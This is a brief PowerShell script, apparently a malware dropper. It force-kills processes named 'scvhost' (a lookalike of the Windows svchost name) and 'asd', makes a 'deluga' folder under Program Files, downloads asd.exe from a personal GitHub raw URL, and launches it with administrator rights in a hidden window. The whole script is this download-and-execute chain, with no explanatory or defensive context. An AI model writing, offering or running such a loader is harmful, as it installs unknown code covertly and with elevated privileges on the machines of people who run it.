Get-Process -Name "scvhost" -ErrorAction SilentlyContinue | Stop-Process -Force
Get-Process -Name "asd" -ErrorAction SilentlyContinue | Stop-Process -Force

$path = "${env:ProgramFiles}\deluga"
if (!(Test-Path $path)) { New-Item -ItemType Directory -Path $path -Force | Out-Null }

$file = "$path\asd.exe"
(New-Object System.Net.WebClient).DownloadFile("https://raw.githubusercontent.com/requiemmmmmmm/reqq/main/asd.exe", $file)

Start-Process -FilePath $file -Verb RunAs -WindowStyle Hidden